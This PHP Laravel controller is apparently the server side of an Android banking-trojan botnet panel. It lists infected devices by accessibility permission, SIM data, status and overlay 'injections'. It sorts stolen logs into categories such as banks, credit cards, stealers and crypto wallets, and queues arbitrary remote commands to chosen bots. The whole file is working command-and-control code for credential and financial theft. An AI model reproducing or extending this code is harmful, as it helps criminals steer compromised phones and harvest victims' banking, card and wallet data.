<?php

namespace App\Http\Controllers;

use App\Helpers\ApiResponse;
use App\Http\Resources\Bot\BotCollection;
use App\Http\Resources\Bot\BotResource;
use App\Models\Bot;
use App\Models\BotCommand;
use App\Models\BotLog;
use App\Models\Injection;
use Carbon\Carbon;
use Exception;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Validation\ValidationException;

class BotController extends Controller
{
    /**
     * @throws ValidationException
     */
    public function list(Request $request): JsonResponse
    {
        $this->validate($request, [
            'filters' => 'array',
            'filters.countries' => 'array',
            'filters.injections' => 'array',
            'filters.statuses' => 'array',
            'filters.tags' => 'array',
            'filters.types' => 'array',
            'filters.statuses.*' => 'string|in:online,offline,dead',
            'filters.tags.*' => 'string', // TODO check user tags
            'filters.types.*' => 'string|in:permissionless,blacklisted,favorite',
            'page' => 'integer',
            'limit' => 'integer',
            'filters.query' => 'string',
            'noLimit' => 'boolean',
        ]);

        $countries = $request->get('filters')['countries'] ?? [];
        $injections = $request->get('filters')['injections'] ?? [];
        $statuses = $request->get('filters')['statuses'] ?? [];
        $tags = $request->get('filters')['tags'] ?? [];
        $types = $request->get('filters')['types'] ?? [];
        $searchQuery = $request->get('filters')['query'] ?? [];

        $bots = Bot::orderBy('created_at', 'desc');

        if (!empty($searchQuery)) {
            $bots->where(function ($query) use ($searchQuery) {
                $query->where('id', 'like', "%$searchQuery%")
                    ->orWhere('ip', 'like', "%$searchQuery%")
                    ->orWhere('metadata', 'like', "%$searchQuery%")
                    ->orWhere('sim_data', 'like', "%$searchQuery%");
            });
        }

        if (!in_array('permissionless', $types, true)) {
            $bots->whereRaw('JSON_EXTRACT(permissions, "$.accessibility") = "true"');
        } else {
            $bots->whereRaw('JSON_EXTRACT(permissions, "$.accessibility") = "false"');
        }

        if (count($countries)) {
            $bots->whereIn('country_code', $countries);
        }

        if (count($tags)) {
            $bots->whereIn('tag', $tags);
        } else {
            if (count(auth()->user()->tagsNames)) {
                $bots->whereIn('tag', auth()->user()->tagsNames);
            } elseif(auth()->user()->role !== 'root') {
                $bots->whereIn('tag', []);
            }
        }

        if ($types) {
            $bots->where(function ($query) use ($types) {
                foreach ($types as $type) {
                    switch ($type) {
                        case 'favorite':
                            $query->orWhere('is_favorite', true);
                            break;
                        case 'blacklisted':
                            $query->orWhere('is_blacklisted', true);
                            break;
                    }
                }
            });
        }

        if (count($injections)) {
            $bots->leftJoin('bot_injections', 'bot_injections.bot_id', '=', 'bots.id')
                ->select('bots.*', 'bot_injections.application')
                ->whereIn('bot_injections.application', $injections)
                ->groupBy('bots.id');
        }

        $statusesCount = count($statuses);

        if ($statusesCount && $statusesCount !== 3) {
            $bots->where(function ($query) use ($statuses) {
                foreach ($statuses as $status) {
                    switch ($status) {
                        case 'online':
                            $query->orWhereRaw('updated_at >= DATE_SUB(NOW() , INTERVAL 1 MINUTE)');
                            break;
                        case 'offline':
                            $query->orWhereRaw('updated_at >= DATE_SUB(NOW() , INTERVAL 2400 MINUTE)')->whereRaw('updated_at < DATE_SUB(NOW() , INTERVAL 1 MINUTE)');
                            break;
                        case 'dead':
                            $query->orWhereRaw('updated_at <= DATE_SUB(NOW() , INTERVAL 2400 MINUTE)');
                            break;
                    }
                }
            });
        }

        $bots = $bots->with([
            'logs' => function ($query) {
                $query->groupBy('application');
            },
            'userTimestamps' => function ($query) {
                $query->where('user_id', auth()->user()->id ?? 1);
            },
        ]);

        if($request->get('noLimit')) {
            $bots = $bots->get()->map(function(Bot $bot) {
                return ['id' => $bot->id];
            });

            return new ApiResponse([
                'payload' => $bots,
                'success' => true,
            ]);
        }

        $bots = $bots->paginate($request->get('per_page', 4));


        $bots->load('botInjections', 'botInjections.injection');

        if (!in_array('permissionless', $types, true)) {
            auth()->user()?->entitiesTimestamps?->update([
                'bots' => Carbon::now()->toDateTimeString(),
            ]);
        } else {
            auth()->user()?->entitiesTimestamps?->update([
                'permissionless_bots' => Carbon::now()->toDateTimeString(),
            ]);
        }

        return BotCollection::make($bots)->response();
    }

    public function filters(): ApiResponse
    {
        $filters = Cache::get('filters.list', function (): array {
            $countries = Bot::groupBy('country_code')
                ->select('country_code', 'country')
                ->get()
                ->mapWithKeys(function (Bot $country) {
                    return [$country->country_code => config('countries')[strtoupper($country->country_code)] ?? 'Unknown'];
                });

            $injections = Injection::select('name', 'injections.application', 'type')
                ->join('bot_injections', 'injections.application', '=', 'bot_injections.application')
                ->groupBy('bot_injections.application')
                ->get()
                ->mapWithKeys(function (Injection $injection) {
                    return [
                        $injection->application => [
                            'name' => $injection->name,
                            'type' => $injection->type,
                        ]
                    ];
                });

            $mapApplications = function (BotLog $botLog) {
                return [
                    $botLog->application => [
                        'name' => $botLog->injection->name ?? $botLog->application,
                        'type' => $botLog->injection->type ?? 'not_found',
                    ]
                ];
            };

            $applications = [
                'banks' => BotLog::where('type', 'banks')
                    ->groupBy('application')
                    ->with('injection')
                    ->get()
                    ->mapWithKeys($mapApplications),
                'credit_cards' => BotLog::where('type', 'credit_cards')
                    ->groupBy('application')
                    ->with('injection')
                    ->get()
                    ->mapWithKeys($mapApplications),
                'stealers' => BotLog::where('type', 'stealers')
                    ->groupBy('application')
                    ->with('injection')
                    ->get()
                    ->mapWithKeys($mapApplications),
                'crypt' => BotLog::where('type', 'crypt')
                    ->groupBy('application')
                    ->with('injection')
                    ->get()
                    ->mapWithKeys($mapApplications),
                'shops' => BotLog::where('type', 'shops')
                    ->groupBy('application')
                    ->with('injection')
                    ->get()
                    ->mapWithKeys($mapApplications),
                'emails' => BotLog::where('type', 'emails')
                    ->groupBy('application')
                    ->with('injection')
                    ->get()
                    ->mapWithKeys($mapApplications),
                'wallets' => BotLog::where('type', 'wallets')
                    ->groupBy('application')
                    ->with('injection')
                    ->get()
                    ->mapWithKeys($mapApplications),
            ];

            $start_date = Bot::select('created_at')->orderByDesc('created_at')->first()?->created_at->format('Y-m-d H:i:s');

            $filters = [
                'countries' => $countries,
                'injections' => $injections,
                'start_date' => $start_date,
                'applications' => $applications,
            ];

            return $filters;
        });

        return ApiResponse::success($filters);
    }

    /**
     * @throws ValidationException
     */
    public function sendCommand(Request $request): ApiResponse
    {
        // TODO payload validate for commands
        $this->validate($request, [
            'command' => 'required|string',
            'payload' => 'array',
            'botIds' => 'array|min:1',
            'botIds.*' => 'string|exists:bots,id',
        ]);

        $botIds = collect($request->get('botIds'))->unique();

        foreach ($botIds as $botId) {
            $payload = $request->get('payload', []);
            if ($payload === []) {
                $payload = "";
            }
            $command = [
                'command' => $request->get('command'),
                'payload' => $payload,
            ];
            BotCommand::create([
                'bot_id' => $botId,
                'command' => $command,
                'is_processed' => false,
                'run_at' => Carbon::now(),
            ]);
        }

        return ApiResponse::success();
    }

    /**
     * @throws ValidationException
     */
    public function setType(string $botId, Request $request): ApiResponse
    {
        $routeParamsRequest = new Request($request->route()[2]);

        $this->validate($routeParamsRequest, [
            'botId' => 'exists:bots,id',
        ]);

        $this->validate($request, [
            'type' => 'required|string|in:favorite,blacklisted',
            'value' => 'required|boolean',
        ]);

        $bot = Bot::findOrFail($botId);

        switch ($request->get('type')) {
            case 'favorite':
                $bot->is_favorite = $request->get('value');
                break;
            case 'blacklisted':
                $bot->is_blacklisted = $request->get('value');
                break;
            default:
                break;
        }

        $bot->save();

        return ApiResponse::success(BotResource::make($bot));
    }

    /**
     * @throws ValidationException
     */
    public function delete(Request $request): ApiResponse
    {
        $this->validate($request, [
            'botIds' => 'required|array',
            'botIds.*' => 'exists:bots,id',
        ]);

        Bot::whereIn('id', $request->get('botIds'))->delete();

        return ApiResponse::success([
            'botIds' => $request->get('botIds'),
        ]);
    }

    public function deleteAllRemovedApp(): ApiResponse
    {
        $bots = Bot::whereRaw('updated_at <= DATE_SUB(NOW() , INTERVAL 2400 MINUTE)');

        if (count(auth()->user()->tagsNames)) {
            $bots->whereIn('tag', auth()->user()->tagsNames);
        } elseif(auth()->user()->role !== 'root') {
            $bots->whereIn('tag', []);
        }

        $bots = $bots->get();

        foreach ($bots as $bot) {
            $bot->delete();
        }

        return ApiResponse::success([
            'botIds' => $bots->pluck('id'),
        ]);
    }

    public function editComment(Request $request): ApiResponse
    {
        $this->validate($request, [
            'comment' => 'string|nullable',
            'botIds' => 'array|required',
            'botIds.*' => 'exists:bots,id',
        ]);

        $bots = Bot::whereIn('id', $request->get('botIds'))->get();

        $botsResponse = [];

        foreach($bots as $bot) {
            $bot->update([
                'comment' => $request->get('comment'),
            ]);

            $botsResponse[] = [
                'id' => $bot->id,
                'comment' => $request->get('comment'),
            ];
        }

        return ApiResponse::success($botsResponse);
    }
}
